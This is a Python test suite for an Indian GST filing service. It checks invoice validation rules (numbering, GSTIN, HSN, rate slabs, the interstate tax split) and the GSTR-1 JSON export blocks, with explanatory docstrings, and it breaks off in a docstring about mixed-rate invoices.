"""Pre-filing validation, the portal JSON shapes, and the export endpoints."""
from __future__ import annotations

import csv
import io
import json
from datetime import date
from decimal import Decimal

import pytest

from app.models.invoice import Invoice, InvoiceStatus, InvoiceType
from app.services import filing as filing_service
from app.services import gst_calendar
from app.services.filing import ZERO, Severity
from tests.conftest import (
    BUSINESS_GSTIN,
    SUPPLIER_GSTIN_OTHER_STATE,
    SUPPLIER_GSTIN_SAME_STATE,
)

PERIOD = "2026-04"


def sale(**kwargs) -> Invoice:
    """An unsaved inter-state B2B sale: Maharashtra seller, Karnataka buyer."""
    defaults = dict(
        id=kwargs.pop("id", None),
        business_id=1,
        invoice_type=InvoiceType.SALES,
        status=InvoiceStatus.PARSED,
        counterparty_gstin=SUPPLIER_GSTIN_OTHER_STATE,
        counterparty_name="Northwind Supplies",
        invoice_number="S-001",
        invoice_date=date(2026, 4, 15),
        period=PERIOD,
        place_of_supply="29",
        hsn_code="84713010",
        tax_rate=Decimal("18"),
        taxable_value=Decimal("100000.00"),
        cgst=Decimal("0.00"),
        sgst=Decimal("0.00"),
        igst=Decimal("18000.00"),
        cess=Decimal("0.00"),
        total_value=Decimal("118000.00"),
        reverse_charge=False,
    )
    defaults.update(kwargs)
    return Invoice(**defaults)


def local_sale(**kwargs) -> Invoice:
    """An intra-state sale: Maharashtra to Maharashtra, so CGST + SGST."""
    defaults = dict(
        counterparty_gstin=SUPPLIER_GSTIN_SAME_STATE,
        place_of_supply="27",
        cgst=Decimal("9000.00"),
        sgst=Decimal("9000.00"),
        igst=Decimal("0.00"),
    )
    defaults.update(kwargs)
    return sale(**defaults)


def save(db, business_id, invoice) -> Invoice:
    invoice.business_id = business_id
    db.add(invoice)
    db.commit()
    db.refresh(invoice)
    return invoice


def issues_for(invoice, *, state="27") -> dict[str, Severity]:
    found = filing_service.validate_invoice(
        invoice, business_state=state, period=PERIOD
    )
    return {issue.field: issue.severity for issue in found}


# ---------------------------------------------------------------------------
# Portal conventions
# ---------------------------------------------------------------------------

def test_period_becomes_the_portal_form():
    """The portal wants MMYYYY, not the YYYY-MM this codebase stores."""
    assert filing_service.to_portal_period("2026-04") == "042026"
    assert filing_service.to_portal_period("2026-12") == "122026"


def test_dates_become_the_portal_form():
    assert filing_service.to_portal_date(date(2026, 4, 5)) == "05-04-2026"
    assert filing_service.to_portal_date(None) is None


# ---------------------------------------------------------------------------
# Validation
# ---------------------------------------------------------------------------

def test_a_clean_invoice_raises_nothing():
    assert issues_for(sale()) == {}


def test_missing_invoice_number_is_an_error():
    assert issues_for(sale(invoice_number=None))["invoice_number"] is Severity.ERROR


def test_an_over_long_invoice_number_is_an_error():
    """The portal caps invoice numbers at 16 characters."""
    assert issues_for(sale(invoice_number="X" * 17))["invoice_number"] is Severity.ERROR


def test_an_invoice_number_of_exactly_sixteen_characters_is_allowed():
    """Sixteen is the limit, not the first length past it.

    A serial that fits exactly is what a business with a long prefix ends up
    with, and refusing it would send them to renumber a book the portal was
    always going to take.
    """
    assert issues_for(sale(invoice_number="INV-2026-2704/12")) == {}


def test_a_sale_numbered_with_a_character_rule_46_forbids_is_an_error():
    """Rule 46(b) allows letters, digits, '-' and '/'. A hash is not one."""
    assert issues_for(sale(invoice_number="INV#42"))["invoice_number"] is Severity.ERROR


def test_a_space_in_a_sale_number_is_an_error():
    """The one a person types without noticing, and the portal refuses."""
    assert issues_for(sale(invoice_number="INV 42"))["invoice_number"] is Severity.ERROR


def test_the_characters_rule_46_does_allow_raise_nothing():
    for number in ("INV-2026/0042", "S001", "2026/04-9"):
        assert issues_for(sale(invoice_number=number)) == {}, number


def test_the_message_names_the_character_that_has_to_go():
    """A number is up to sixteen characters. "It is wrong" is not a fix."""
    found = filing_service.validate_invoice(
        sale(invoice_number="INV#42"), business_state="27", period=PERIOD
    )
    message = next(i.message for i in found if i.field == "invoice_number")
    assert "'#'" in message
    assert "Rule 46(b)" in message


def test_a_number_that_is_both_too_long_and_illegal_says_both():
    """Two independent things wrong with one string.

    Reported together rather than one after the other: a business that fixes
    the length and re-uploads only to be told about the character has been
    sent to the portal twice by a screen that knew both the first time.
    """
    found = filing_service.validate_invoice(
        sale(invoice_number="INV#" + "X" * 20), business_state="27", period=PERIOD
    )
    messages = [i.message for i in found if i.field == "invoice_number"]
    assert len(messages) == 2
    assert any("the portal allows 16" in m for m in messages)
    assert any("Rule 46(b)" in m for m in messages)


def test_a_supplier_serial_rule_46_forbids_is_not_the_buyers_problem():
    """The number on a purchase is the supplier's, copied off their document.

    It is what GSTR-2B will carry too, so it matches exactly as well as a
    compliant one — and correcting it is not something the buyer has the
    authority to do. Complaining would be an error nobody can clear.
    """
    found = issues_for(sale(invoice_type=InvoiceType.PURCHASE, invoice_number="INV#42"))
    # Only the number is in question here — a purchase built from a sale
    # fixture raises its own complaints about the tax split, which the
    # purchase-side tests below are about.
    assert "invoice_number" not in found


def test_missing_date_is_an_error():
    assert issues_for(sale(invoice_date=None))["invoice_date"] is Severity.ERROR


def test_an_invoice_from_another_period_is_a_warning_not_an_error():
    """Late-filed invoices are routine; they are worth saying, not blocking."""
    assert issues_for(sale(period="2026-03"))["invoice_date"] is Severity.WARNING


def test_an_invalid_counterparty_gstin_is_an_error():
    """A GSTIN that does not checksum is a credit the customer cannot claim."""
    assert (
        issues_for(sale(counterparty_gstin="29AAGCB7383J1Z9"))["counterparty_gstin"]
        is Severity.ERROR
    )


def test_a_sale_without_a_gstin_is_only_a_b2c_warning():
    assert (
        issues_for(sale(counterparty_gstin=None, place_of_supply="29"))[
            "counterparty_gstin"
        ]
        is Severity.WARNING
    )


def test_a_purchase_without_a_supplier_gstin_is_an_error():
    """It can never be matched in GSTR-2B, so the credit is unclaimable."""
    invoice = sale(invoice_type=InvoiceType.PURCHASE, counterparty_gstin=None)
    assert issues_for(invoice)["counterparty_gstin"] is Severity.ERROR


def test_a_missing_hsn_is_a_warning_and_a_malformed_one_an_error():
    assert issues_for(sale(hsn_code=None))["hsn_code"] is Severity.WARNING
    assert issues_for(sale(hsn_code="123"))["hsn_code"] is Severity.ERROR
    assert issues_for(sale(hsn_code="84AB3010"))["hsn_code"] is Severity.ERROR


def test_the_three_hsn_lengths_the_portal_takes_raise_nothing():
    """Four, six and eight digits. Six is the one a turnover band lands on.

    Under ₹5 crore an invoice needs four digits and above it six, so the
    middle length is the one most of these codes are actually filed at.
    """
    for code in ("8471", "847130", "84713010"):
        assert issues_for(sale(hsn_code=code)) == {}, code


def test_a_rate_that_is_not_a_gst_slab_is_an_error():
    """There is no 15% slab; a rate outside the set is data entry every time."""
    assert issues_for(sale(tax_rate=Decimal("15")))["tax_rate"] is Severity.ERROR


def test_tax_that_does_not_match_the_rate_is_an_error():
    assert (
        issues_for(sale(igst=Decimal("12000.00"), total_value=Decimal("112000.00")))[
            "tax_rate"
        ]
        is Severity.ERROR
    )


def test_a_rupee_of_rounding_is_not_a_validation_error():
    """Both sides round independently at line and at invoice."""
    assert "tax_rate" not in issues_for(
        sale(igst=Decimal("18000.60"), total_value=Decimal("118000.60"))
    )


def test_a_rupee_out_is_the_tolerance_itself_and_is_allowed():
    """The tolerance is inclusive at both checks, on purpose.

    A rupee is the largest drift a per-line rounding can leave on either the
    tax or the total, so the invoice that is off by exactly one is the common
    correct invoice rather than the first wrong one.
    """
    assert issues_for(sale(igst=Decimal("18001.00"), total_value=Decimal("118001.00"))) == {}
    assert issues_for(sale(total_value=Decimal("118001.00"))) == {}


def test_an_unrateable_tax_names_the_slab_it_will_be_filed_at():
    """One line, no stored rate, and figures that imply no slab.

    The message has to say which rate the return will carry, because that is
    what the portal will reject — "does not match the breakdown" would be a
    message about a breakdown this invoice does not have.
    """
    found = filing_service.validate_invoice(
        sale(tax_rate=None, igst=Decimal("11500.00"), total_value=Decimal("111500.00")),
        business_state="27",
        period=PERIOD,
    )

    message = next(i.message for i in found if i.field == "tax_rate")
    assert "matches no GST rate" in message
    assert "12%, the nearest slab" in message


def test_every_tax_head_counts_toward_what_the_total_is_checked_against():
    """Cess and the two local heads are tax as much as IGST is.

    The total is checked against taxable plus tax, and the tax is these four
    added up — a head left out of that sum reports a correct invoice as one
    that does not foot, and does it on every intra-state sale in the period.
    """
    invoice = local_sale(cess=Decimal("1000.00"), total_value=Decimal("119000.00"))

    assert issues_for(invoice) == {}


def test_cess_is_left_out_of_the_rate_check_because_it_has_its_own_base():
    """Cess is not levied at the GST rate, so counting it in makes 18% look wrong.

    ₹1,000 of cess on a ₹1,00,000 supply at 18% is a correct invoice; folded
    into the rate comparison it reads as ₹19,000 of tax where ₹18,000 was due,
    which is an error against a document that has nothing wrong with it.
    """
    invoice = sale(cess=Decimal("1000.00"), total_value=Decimal("119000.00"))

    assert issues_for(invoice) == {}


def test_a_total_that_does_not_add_up_is_an_error():
    assert issues_for(sale(total_value=Decimal("999999.00")))["total_value"] is (
        Severity.ERROR
    )


def test_an_interstate_supply_carrying_local_tax_is_an_error():
    """Tax paid to the wrong government, recoverable only by amending."""
    invoice = sale(
        place_of_supply="29",
        igst=Decimal("0.00"),
        cgst=Decimal("9000.00"),
        sgst=Decimal("9000.00"),
    )
    assert issues_for(invoice)["igst"] is Severity.ERROR


def test_an_intrastate_supply_carrying_igst_is_an_error():
    invoice = local_sale(
        igst=Decimal("18000.00"), cgst=Decimal("0.00"), sgst=Decimal("0.00")
    )
    assert issues_for(invoice)["igst"] is Severity.ERROR


def test_an_inter_state_supply_carrying_one_local_head_is_still_the_wrong_tax():
    """Either of them alone is CGST/SGST on a supply that owed IGST.

    An invoice carrying only one half is malformed twice over, and reading the
    two heads together — rather than one and then the other — is what makes
    the half-filled row report anything at all.
    """
    cgst_only = sale(igst=ZERO, cgst=Decimal("18000.00"))
    sgst_only = sale(igst=ZERO, sgst=Decimal("18000.00"))

    assert issues_for(cgst_only)["igst"] is Severity.ERROR
    assert issues_for(sgst_only)["igst"] is Severity.ERROR


def test_the_split_is_not_judged_when_there_is_no_supplier_state_to_judge_it_by():
    """A business with no GSTIN on file yet has no state to compare against.

    Comparing against a missing state makes every supply look inter-state, so
    a business part-way through onboarding would be told its own local sales
    carry the wrong tax — an error it cannot act on and did not earn.
    """
    assert issues_for(local_sale(), state=None) == {}


def test_unequal_cgst_and_sgst_is_an_error():
    invoice = local_sale(cgst=Decimal("10000.00"), sgst=Decimal("8000.00"))
    assert issues_for(invoice)["cgst"] is Severity.ERROR


def test_a_clean_intrastate_sale_raises_nothing():
    assert issues_for(local_sale()) == {}


def test_the_place_of_supply_printed_on_a_sale_beats_the_buyers_own_state():
    """Bill-to-ship-to: a Karnataka customer taking delivery in Maharashtra.

    s.10 puts the supply where the goods end up, and the invoice says where
    that is. The buyer's registration is only the fallback for an invoice that
    did not carry the field — read the other way round, a perfectly ordinary
    local delivery to an out-of-state customer is reported as carrying the
    wrong tax.
    """
    invoice = local_sale(counterparty_gstin=SUPPLIER_GSTIN_OTHER_STATE)

    assert invoice.place_of_supply == "27"
    assert issues_for(invoice) == {}


def test_a_sale_with_no_derivable_place_of_supply_is_an_error():
    invoice = sale(counterparty_gstin=None, place_of_supply=None)
    assert issues_for(invoice)["place_of_supply"] is Severity.ERROR


# ---------------------------------------------------------------------------
# The same split, seen from the buying end
#
# s.7/s.8 of the IGST Act compare the *supplier's* location with the place of
# supply, and on a purchase the supplier is the counterparty. The place of
# supply on a purchase is our own state — which is what a vendor prints on the
# invoice and what the parser reads off it.
# ---------------------------------------------------------------------------

def purchase(**kwargs) -> Invoice:
    """An inter-state purchase: Karnataka supplier, Maharashtra buyer (us)."""
    defaults = dict(
        invoice_type=InvoiceType.PURCHASE,
        invoice_number="P-001",
        # What the Karnataka vendor prints: the supply lands in our state.
        place_of_supply="27",
    )
    defaults.update(kwargs)
    return sale(**defaults)


def test_an_interstate_purchase_is_clean_when_its_place_of_supply_was_read():
    """Whether the parser found the field cannot decide whether it is fileable.

    Comparing the place of supply with our own state made every inter-state
    purchase look intra-state, because on a purchase the place of supply *is*
    our state. The identical invoice with the field missing passed.
    """
    assert issues_for(purchase()) == {}
    assert issues_for(purchase(place_of_supply=None)) == {}


def test_a_purchase_collected_in_the_suppliers_own_state_is_a_local_supply():
    """Ex-works: we collect in Karnataka, so Karnataka's own tax applies.

    The invoice says where the supply took place and it is not our state. Our
    state is only the fallback for a purchase whose place of supply the parser
    never found — used ahead of the field, this correct invoice reads as an
    inter-state supply carrying CGST and SGST.
    """
    invoice = purchase(
        place_of_supply="29",
        igst=Decimal("0.00"),
        cgst=Decimal("9000.00"),
        sgst=Decimal("9000.00"),
    )

    assert issues_for(invoice) == {}


def test_an_interstate_purchase_charged_local_tax_is_an_error():
    """A Karnataka supplier charging CGST/SGST is tax paid to Maharashtra.

    Neither government is owed what it received, the credit will not match in
    GSTR-2B, and this validated clean.
    """
    invoice = purchase(
        igst=Decimal("0.00"),
        cgst=Decimal("9000.00"),
        sgst=Decimal("9000.00"),
    )
    assert issues_for(invoice)["igst"] is Severity.ERROR


def test_an_intrastate_purchase_carrying_igst_is_still_an_error():
    invoice = purchase(
        counterparty_gstin=SUPPLIER_GSTIN_SAME_STATE,
        igst=Decimal("18000.00"),
        cgst=Decimal("0.00"),
        sgst=Decimal("0.00"),
    )
    assert issues_for(invoice)["igst"] is Severity.ERROR


def test_a_clean_intrastate_purchase_raises_nothing():
    invoice = purchase(
        counterparty_gstin=SUPPLIER_GSTIN_SAME_STATE,
        igst=Decimal("0.00"),
        cgst=Decimal("9000.00"),
        sgst=Decimal("9000.00"),
    )
    assert issues_for(invoice) == {}


def test_an_invoice_with_no_value_at_all_is_an_error():
    invoice = sale(
        taxable_value=Decimal("0.00"),
        igst=Decimal("0.00"),
        total_value=Decimal("0.00"),
        tax_rate=None,
    )
    assert issues_for(invoice)["taxable_value"] is Severity.ERROR

    # And it is *this* error, not the tax-on-nothing one below it. Both are
    # reported against the same field, so only the message separates an empty
    # row from a row whose taxable value went missing — and they ask the
    # reader for different things.
    found = filing_service.validate_invoice(invoice, business_state="27", period=PERIOD)
    message = next(i.message for i in found if i.field == "taxable_value")
    assert message == "Invoice has no taxable value and no tax"


class TestTaxOnATaxableValueOfZero:
    """The gap between the two money checks, which nothing else covered.

    "No value and no tax" fires only when both are empty, and the rate
    cross-check below it is skipped when there is no taxable value to apply a
    rate to. An invoice carrying real tax against a taxable value of zero fell
    between them and validated completely clean — then filed as a rate-zero
    line carrying tax, which the portal rejects on upload.

    It is not an exotic row either: it is what a photographed invoice comes
    back as when the extractor reads the tax boxes and misses the figure they
    were computed from.
    """

    def broken(self, **kwargs) -> Invoice:
        return sale(taxable_value=Decimal("0.00"), tax_rate=None, **kwargs)

    def test_it_is_an_error(self):
        assert issues_for(self.broken())["taxable_value"] is Severity.ERROR

    def test_it_is_the_only_thing_reported(self):
        """One problem, said once.

        The rate cross-check is skipped for exactly this invoice, and it has to
        be: a taxable value of zero derives a rate of zero, so it would also
        report tax that "matches no GST rate on 0.00" — a second error, about
        the same missing figure, telling the reader to correct the tax when the
        tax is the half that was read correctly.
        """
        # A total of ₹18,000 against ₹18,000 of tax and nothing taxable: the
        # row foots, so the missing value is the only thing left wrong with it.
        invoice = self.broken(total_value=Decimal("18000.00"))

        assert issues_for(invoice) == {"taxable_value": Severity.ERROR}

    def test_the_message_says_the_value_is_missing_not_nil(self):
        found = filing_service.validate_invoice(
            self.broken(), business_state="27", period=PERIOD
        )
        message = next(i.message for i in found if i.field == "taxable_value")
        assert "18000.00" in message
        assert "missing rather than nil" in message

    def test_it_blocks_the_period_from_being_filed(self, db_session, business):
        save(db_session, business.id, self.broken())
        report = filing_service.validate_period(db_session, business, PERIOD)
        assert report.ok is False

    def test_a_purchase_is_caught_the_same_way(self):
        # Tax from nothing is not a direction-specific mistake, and on the
        # purchase side it also throws off the 2B comparison.
        invoice = self.broken(invoice_type=InvoiceType.PURCHASE)
        assert issues_for(invoice)["taxable_value"] is Severity.ERROR

    def test_the_period_still_exports_instead_of_dividing_by_zero(self, db_session, business):
        """A period with errors in it is still exportable, so the build sees this.

        Errors block *filing*, not exporting — a CA checking the period before
        anything is uploaded is exactly who asks for the export of a period
        that does not validate. So the generator meets this invoice, and it
        has no explicit rate, so it derives one from tax over taxable value.
        Deriving it from a taxable value of zero raises `DivisionByZero`,
        which turns the one export that would have shown the problem into a
        500 that says nothing about it.
        """
        save(db_session, business.id, self.broken())

        document = filing_service.build_gstr1(db_session, business, PERIOD)

        item = document["b2b"][0]["inv"][0]["itms"][0]["itm_det"]
        assert item["rt"] == 0.0
        assert item["txval"] == 0.00

    def test_an_exempt_supply_is_still_not_an_error(self):
        # Value with no tax is the nil-rated and exempt case, which is a real
        # supply and files in its own block. Only the reverse is impossible.
        invoice = sale(
            igst=Decimal("0.00"),
            total_value=Decimal("100000.00"),
            tax_rate=Decimal("0"),
        )
        assert issues_for(invoice) == {}


def test_validate_period_reports_ok_only_when_nothing_blocks(db_session, business):
    save(db_session, business.id, sale())
    clean = filing_service.validate_period(db_session, business, PERIOD)
    assert clean.ok is True
    assert clean.invoice_count == 1

    save(db_session, business.id, sale(invoice_number=None))
    broken = filing_service.validate_period(db_session, business, PERIOD)
    assert broken.ok is False
    assert len(broken.errors) == 1


def test_warnings_alone_do_not_block_a_filing(db_session, business):
    save(db_session, business.id, sale(hsn_code=None))
    report = filing_service.validate_period(db_session, business, PERIOD)

    assert report.ok is True
    assert len(report.warnings) == 1


class TestAnUnreadableRowBlocksThePeriod:
    """A supply left out of the return has to be said out loud.

    The return builders drop every invoice whose figures were never extracted,
    which is right for the document — a row of zeros is worse than no row — but
    it dropped them from validation too, and validation is the only thing that
    says whether a period may be filed. A month holding a failed sales
    extraction came back ``ok`` with that supply missing from GSTR-1, from the
    CSV the CA checks it against, and from the totals stored on the filing.
    Under-declared output tax carries interest.
    """

    def unreadable(self, **kwargs):
        """A row as it looks before anything has been read off it."""
        return sale(
            invoice_number=None,
            invoice_date=None,
            place_of_supply=None,
            hsn_code=None,
            tax_rate=None,
            taxable_value=Decimal("0.00"),
            igst=Decimal("0.00"),
            total_value=Decimal("0.00"),
            **kwargs,
        )

    def test_a_failed_extraction_blocks_a_period_that_looked_clean(
        self, db_session, business
    ):
        save(db_session, business.id, sale())
        save(
            db_session,
            business.id,
            self.unreadable(status=InvoiceStatus.FAILED, parse_error="model gave up"),
        )

        report = filing_service.validate_period(db_session, business, PERIOD)

        assert report.ok is False
        (issue,) = report.errors
        assert issue.field == "status"
        assert "model gave up" in issue.message

    def test_a_row_still_being_extracted_blocks_it_too(self, db_session, business):
        save(db_session, business.id, self.unreadable(status=InvoiceStatus.PROCESSING))

        report = filing_service.validate_period(db_session, business, PERIOD)

        assert report.ok is False
        (issue,) = report.errors
        assert "Still being extracted" in issue.message

    def test_one_complaint_per_row_not_six(self, db_session, business):
        """Not-read is the finding. The empty fields are only its symptoms.

        Run through the field checks, one pending upload produced a complaint
        about its number, its date, its GSTIN, its rate and its total — none of
        which said the thing that was actually wrong.
        """
        save(db_session, business.id, self.unreadable(status=InvoiceStatus.UPLOADED))

        report = filing_service.validate_period(db_session, business, PERIOD)

        assert len(report.issues) == 1

    def test_a_purchase_register_is_judged_the_same_way(self, db_session, business):
        save(
            db_session,
            business.id,
            self.unreadable(
                invoice_type=InvoiceType.PURCHASE, status=InvoiceStatus.FAILED
            ),
        )

        report = filing_service.validate_period(
            db_session, business, PERIOD, invoice_type=InvoiceType.PURCHASE
        )

        assert report.ok is False

    def test_the_unreadable_row_is_still_out_of_the_return(self, db_session, business):
        """Reported, not filed. A row of zeros in GSTR-1 is the worse answer."""
        save(db_session, business.id, self.unreadable(status=InvoiceStatus.UPLOADED))

        document = filing_service.build_gstr1(db_session, business, PERIOD)

        assert set(document) == {"gstin", "fp", "version", "hash"}


# ---------------------------------------------------------------------------
# GSTR-1
# ---------------------------------------------------------------------------

def test_gstr1_envelope_carries_the_gstin_and_period(db_session, business):
    save(db_session, business.id, sale())
    document = filing_service.build_gstr1(db_session, business, PERIOD)

    assert document["gstin"] == BUSINESS_GSTIN
    assert document["fp"] == "042026"
    assert document["version"] == filing_service.GSTR1_VERSION


def test_gstr1_groups_b2b_invoices_by_counterparty(db_session, business):
    save(db_session, business.id, sale(invoice_number="S-1"))
    save(db_session, business.id, sale(invoice_number="S-2"))
    save(
        db_session,
        business.id,
        local_sale(invoice_number="S-3"),
    )

    document = filing_service.build_gstr1(db_session, business, PERIOD)

    by_ctin = {block["ctin"]: block for block in document["b2b"]}
    assert set(by_ctin) == {SUPPLIER_GSTIN_OTHER_STATE, SUPPLIER_GSTIN_SAME_STATE}
    assert len(by_ctin[SUPPLIER_GSTIN_OTHER_STATE]["inv"]) == 2
    assert len(by_ctin[SUPPLIER_GSTIN_SAME_STATE]["inv"]) == 1


def test_gstr1_b2b_invoice_carries_the_portal_field_names(db_session, business):
    save(db_session, business.id, sale())
    document = filing_service.build_gstr1(db_session, business, PERIOD)

    invoice = document["b2b"][0]["inv"][0]
    assert invoice["inum"] == "S-001"
    assert invoice["idt"] == "15-04-2026"
    assert invoice["val"] == 118000.00
    assert invoice["pos"] == "29"
    assert invoice["rchrg"] == "N"

    item = invoice["itms"][0]["itm_det"]
    assert item["rt"] == 18.0
    assert item["txval"] == 100000.00
    assert item["iamt"] == 18000.00
    assert item["camt"] == 0.0


def small_b2c(**kwargs) -> Invoice:
    """An inter-state counter sale below the B2CL limit, tax included.

    ₹50,000 plus 18% is ₹59,000, which is under the ₹1 lakh that sends an
    inter-state B2C supply to the invoice-wise block. The default ``sale`` is
    not: ₹1 lakh plus tax clears the limit, and using it here would assert the
    summary block on an invoice that no longer belongs in it.
    """
    defaults = dict(
        counterparty_gstin=None,
        place_of_supply="29",
        taxable_value=Decimal("50000.00"),
        igst=Decimal("9000.00"),
        total_value=Decimal("59000.00"),
    )
    defaults.update(kwargs)
    return sale(**defaults)


def test_gstr1_puts_small_unregistered_sales_in_b2cs(db_session, business):
    save(db_session, business.id, small_b2c(counterparty_name="Walk-in"))

    document = filing_service.build_gstr1(db_session, business, PERIOD)

    assert "b2b" not in document
    (bucket,) = document["b2cs"]
    assert bucket["sply_ty"] == "INTER"
    assert bucket["pos"] == "29"
    assert bucket["rt"] == 18.0
    assert bucket["txval"] == 50000.00


def test_gstr1_summarises_b2cs_by_place_and_rate(db_session, business):
    for number in ("C-1", "C-2"):
        save(db_session, business.id, small_b2c(invoice_number=number))

    document = filing_service.build_gstr1(db_session, business, PERIOD)

    (bucket,) = document["b2cs"]
    assert bucket["txval"] == 100000.00
    assert bucket["iamt"] == 18000.00


def test_gstr1_carries_the_state_split_into_a_b2cs_bucket(db_session, business):
    """A counter sale in the seller's own state is CGST + SGST, not IGST.

    Every other B2CS assertion here is on an inter-state sale, so only `iamt`
    was ever checked — and for a retailer the intra-state row is the common
    one. Filing it with the tax in the wrong head is a return that has to be
    amended.
    """
    for number in ("C-1", "C-2"):
        save(
            db_session,
            business.id,
            local_sale(invoice_number=number, counterparty_gstin=None),
        )

    document = filing_service.build_gstr1(db_session, business, PERIOD)

    (bucket,) = document["b2cs"]
    assert bucket["sply_ty"] == "INTRA"
    assert bucket["pos"] == "27"
    assert bucket["txval"] == 200000.00
    assert bucket["camt"] == 18000.00
    assert bucket["samt"] == 18000.00
    assert bucket["iamt"] == 0.0
    assert bucket["csamt"] == 0.0


def test_gstr1_carries_the_state_split_and_cess_into_the_hsn_summary(db_session, business):
    """The HSN table is filed alongside the invoices and must agree with them."""
    save(
        db_session,
        business.id,
        local_sale(invoice_number="S-1", cess=Decimal("2500.00")),
    )
    save(
        db_session,
        business.id,
        local_sale(invoice_number="S-2", cess=Decimal("2500.00")),
    )

    document = filing_service.build_gstr1(db_session, business, PERIOD)

    (entry,) = document["hsn"]["data"]
    assert entry["hsn_sc"] == "84713010"
    assert entry["txval"] == 200000.00
    assert entry["camt"] == 18000.00
    assert entry["samt"] == 18000.00
    assert entry["iamt"] == 0.0
    assert entry["csamt"] == 5000.00


def test_gstr1_declares_the_hsn_quantity_it_does_not_yet_extract(db_session, business):
    """`qty` is 0 and the unit is the portal's catch-all, deliberately.

    Filing a made-up quantity against a real HSN code is worse than filing
    none, so this asserts the placeholder rather than leaving it unpinned.
    """
    save(db_session, business.id, sale())

    document = filing_service.build_gstr1(db_session, business, PERIOD)

    (entry,) = document["hsn"]["data"]
    assert entry["qty"] == 0
    assert entry["uqc"] == "NOS"


def test_gstr1_lists_large_interstate_unregistered_sales_separately(db_session, business):
    """Above ₹2.5 lakh a B2C inter-state supply is reported invoice by invoice."""
    save(
        db_session,
        business.id,
        sale(
            counterparty_gstin=None,
            place_of_supply="29",
            taxable_value=Decimal("300000.00"),
            igst=Decimal("54000.00"),
            total_value=Decimal("354000.00"),
        ),
    )

    document = filing_service.build_gstr1(db_session, business, PERIOD)

    assert "b2cs" not in document
    (block,) = document["b2cl"]
    assert block["pos"] == "29"
    assert block["inv"][0]["val"] == 354000.00
    # Invoice by invoice means by number: it is what an amendment in a later
    # period has to name to find this supply again.
    assert block["inv"][0]["inum"] == "S-001"


def test_a_b2c_sale_worth_exactly_the_threshold_is_summarised(db_session, business):
    """The threshold is the last value that is summarised, not the first listed.

    A round ₹1,00,000 invoice is not a rare one, and the two blocks are
    reconciled against table 3.2 of the same period's 3B — a supply in the
    wrong one is a mismatch the portal raises on upload rather than a figure
    anybody can see is wrong.
    """
    save(
        db_session,
        business.id,
        sale(
            counterparty_gstin=None,
            place_of_supply="29",
            taxable_value=Decimal("84745.76"),
            igst=Decimal("15254.24"),
            total_value=Decimal("100000.00"),
        ),
    )

    assert filing_service.b2cl_threshold(PERIOD) == Decimal("100000.00")

    document = filing_service.build_gstr1(db_session, business, PERIOD)

    assert "b2cl" not in document
    assert document["b2cs"][0]["txval"] == 84745.76


def test_a_b2b_supply_is_attributed_to_the_state_its_buyer_is_registered_in(
    db_session, business
):
    """`pos` is the field the portal attributes the supply by.

    The place of supply is often not printed on the invoice, and the buyer's
    registration always is. Falling back to our own state instead would file
    every inter-state B2B sale as a local one — the credit lands with the
    wrong government, and the customer's 2B is what says so.
    """
    save(db_session, business.id, sale(place_of_supply=None))

    document = filing_service.build_gstr1(db_session, business, PERIOD)

    assert document["b2b"][0]["inv"][0]["pos"] == "29"


def test_cess_reaches_both_the_invoice_block_and_the_b2cs_summary(db_session, business):
    """Cess is a head of its own in every block, and it is money.

    It is levied on top of GST and is nobody's input credit at these rates, so
    a return that drops it understates what is payable in cash.
    """
    save(
        db_session,
        business.id,
        sale(invoice_number="S-B2B", cess=Decimal("2500.00"), total_value=Decimal("120500.00")),
    )
    save(
        db_session,
        business.id,
        local_sale(
            invoice_number="S-B2C",
            counterparty_gstin=None,
            cess=Decimal("1500.00"),
            total_value=Decimal("119500.00"),
        ),
    )

    document = filing_service.build_gstr1(db_session, business, PERIOD)

    (item,) = document["b2b"][0]["inv"][0]["itms"]
    assert item["itm_det"]["csamt"] == 2500.00
    assert document["b2cs"][0]["csamt"] == 1500.00


class TestAnInvoiceWorthWhatItIsWorth:
    """The invoice value is derived when the row does not carry one.

    ``total_value`` defaults to zero and is only filled when the parser found a
    grand-total label, so a real invoice whose total was printed as "Amount
    Payable" is stored as worth nothing. Read literally, that decided which
    GSTR-1 block a large B2C supply went in — the one place in the return where
    the value is not just a figure but a routing decision.
    """

    def test_a_large_b2c_sale_is_listed_even_with_no_stored_total(
        self, db_session, business
    ):
        """₹3.54 lakh belongs in b2cl whether or not the parser read the total.

        Summarised into b2cs it is a return that reports the supply — so
        nothing looks missing — while omitting the invoice-level detail the
        portal requires above the threshold.
        """
        save(
            db_session,
            business.id,
            sale(
                counterparty_gstin=None,
                place_of_supply="29",
                taxable_value=Decimal("300000.00"),
                igst=Decimal("54000.00"),
                total_value=Decimal("0.00"),
            ),
        )

        document = filing_service.build_gstr1(db_session, business, PERIOD)

        assert "b2cs" not in document
        (block,) = document["b2cl"]
        assert block["inv"][0]["val"] == 354000.00

    def test_a_small_b2c_sale_is_still_summarised(self, db_session, business):
        """The derivation must not push everything into b2cl."""
        save(db_session, business.id, small_b2c(total_value=Decimal("0.00")))

        document = filing_service.build_gstr1(db_session, business, PERIOD)

        assert "b2cl" not in document
        assert document["b2cs"][0]["txval"] == 50000.00

    def test_the_threshold_is_the_value_with_tax_on_it(self, db_session, business):
        """₹2.4 lakh plus 18% is above ₹2.5 lakh; the taxable value alone is not."""
        save(
            db_session,
            business.id,
            sale(
                counterparty_gstin=None,
                place_of_supply="29",
                taxable_value=Decimal("240000.00"),
                igst=Decimal("43200.00"),
                total_value=Decimal("0.00"),
            ),
        )

        document = filing_service.build_gstr1(db_session, business, PERIOD)

        assert document["b2cl"][0]["inv"][0]["val"] == 283200.00

    def test_a_stored_total_still_wins(self, db_session, business):
        """Where the invoice says what it is worth, that is the figure filed.

        A rounded-off or discounted grand total is the number on the document,
        and the portal is being told what the document says.
        """
        save(
            db_session,
            business.id,
            sale(
                counterparty_gstin=None,
                place_of_supply="29",
                taxable_value=Decimal("300000.00"),
                igst=Decimal("54000.00"),
                total_value=Decimal("353999.00"),
            ),
        )

        document = filing_service.build_gstr1(db_session, business, PERIOD)

        assert document["b2cl"][0]["inv"][0]["val"] == 353999.00

    def test_a_b2b_sale_reports_the_derived_value_too(self, db_session, business):
        """b2b already fell back; it keeps doing so through the shared helper."""
        save(db_session, business.id, sale(total_value=Decimal("0.00")))

        document = filing_service.build_gstr1(db_session, business, PERIOD)

        assert document["b2b"][0]["inv"][0]["val"] == 118000.00


class TestAnInvoiceThatMixesRates:
    """A mixed-rate invoice is filed rate by rate, not at a blended average.

    The parser's own schema tells the model to leave ``tax_rate`` null "if the
    invoice mixes rates" and to return the breakdown in ``line_items``, so the
    invoices that most needed the breakdown were exactly the ones filed without
